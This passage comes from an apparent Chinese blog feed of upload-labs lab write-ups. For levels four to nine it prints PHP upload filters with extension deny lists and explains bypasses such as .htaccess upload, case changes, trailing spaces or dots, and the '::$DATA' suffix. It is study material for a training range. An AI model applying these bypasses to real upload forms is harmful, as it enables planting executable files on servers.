class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="审计："><a href="#审计：" class="headerlink" title="审计："></a><strong>审计：</strong></h5><p>跟第三关差不多，但是限制了好多文件名后缀。然而有一种文件格式没禁用，那就是.htaccess。</p><hr><p>重要知识:<br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>启用.htaccess，需要修改httpd.conf，启用AllowOverride(将该值改为all)，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。<br>它里面有这样一段代码：AllowOverride None，如果我们把None改成All<br>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><h6 id="上传绕过："><a href="#上传绕过：" class="headerlink" title="上传绕过："></a><strong>上传绕过：</strong></h6><p>一开始在win下面发现文件名字必须输入东西不然保存不了后来，保存的时候选择所有文件才弄好了：<br><img src="/images/50.png" alt="28ceb9ff1b2c958d9911f43ab5192fa3.png"><br>最终得以上传：<br><img src="/images/51.png" alt="cabc275999801ac653a08c022f8b2197.png"></p><hr><h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a><strong>第五关</strong></h4><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong></p><hr><p>源码跟第四关差不多就是过滤了htacess文件。emmmmmmmm，差不多？但是他没进行大小写限制哎。哈哈哈哈哈哈哈哈哈哈。但是他却对文件名字进行了重命名，意味着htacess的前缀肯定是有东西的，以至于它里面的内容不会起作用。因此我们就不能上传htaccess文件，这时候我们只能上传php并且大小写绕过。<br><strong>绕过上传：</strong><br><img src="/images/52.png" alt="64189fe4f3ffacab05158e2a77e843a5.png"></p><hr><h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a><strong>第六关</strong></h4><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>大小写限制、限制htaccess、上传文件重命名、删除文件后面的点。但是他没有去掉空格哎。emmmmmmmmmmm<br><strong>上传绕过：</strong><br>我们在windows下是无法制造出空格只能抓包改。<br><img src="/images/53.png" alt="25fa780412a4022be8afaa87ee79dc13.png"><br><img src="/images/54.png" alt="7ff7173793cb695e852102fd4718a93f.png"></p><h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a><strong>第七关</strong></h4><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>大小写转化、去空格、禁止上传htacess，但是没有删除文件后面的点。于是利用windows的特性，虽然加上了点但是依旧会忽略掉。<br><strong>上传绕过：</strong><br><img src="/images/55.png" alt="25fa780412a4022be8afaa87ee79dc13.png"><br>访问得到：<br><img src="/images/56.png" alt="7ff7173793cb695e852102fd4718a93f.png"></p><h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a><strong>第八关</strong></h4><hr><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>去空、限制htaccess、去点、大小写限制。但是没有限制data。<br><strong>上传绕过：</strong><br>在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。<br><img src="/images/57.png" alt="30cc306a7211600359ef227c8780ee88.png"></p><p><img src="/images/58.png" alt="7ff7173793cb695e852102fd4718a93f.png"><br>在第八节的时候我曾经想过一个法子，就是他只过滤了一次空格和逗号，所以我就构造了1.php. 空格 .。文件上传成功。但是由于一下两句话：<br><code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code><br><code>$file_ext = strrchr($file_name, &#39;.&#39;);</code><br>他是截取了逗号之后的东西，但是逗号之后是空格，也就是说我们最终得到的文件是随机数字，就没了就没了！！但是我们在后台找到了我文件输入了文件名字，执行之后没有执行php代码只是显示出了文件的源码。</p><h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a><strong>第九关</strong></h4><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>move_upload_file的文件名直接为用户上传的文件名，我们可控。且会删除文件名末尾的点，因此我们可以结合Pass-7用.php.空格.绕过。windows会忽略文件末尾的.和空格。<br>我们在第八个曾经也尝试过第九个的绕过方式，第八个不行但是为什么第九个不行?<br><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>  这里拼接的是原本的文件名字<br><code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code> 这里拼接的是经过”加工”的文件名。恍然大悟了吧。<br><strong>上传绕过：</strong><br><img src="/images/59.png" alt="e0f4d0df9b61a73fb209b7a03d169311.png"><br><img src="/images/60.png" alt="63a86e059ce8741fbb96221023d91a05.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们进行文件上传第二阶段。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>upload-labs-一</title>
    <link href="http://yoursite.com/2019/08/06/upload-labs-%E4%B8%80/"/>
    <id>http://yoursite.com/2019/08/06/upload-labs-一/</id>
    <published>2019-08-06T11:54:48.000Z</published>
    <updated>2019-08-14T06:30:56.342Z</updated>
    
    <content type="html"><![CDATA[<p>今天我们开始文件上传的学习。</p><a id="more"></a><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a><strong>第一关</strong></h4><hr><h5 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a><strong>源代码：</strong></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span 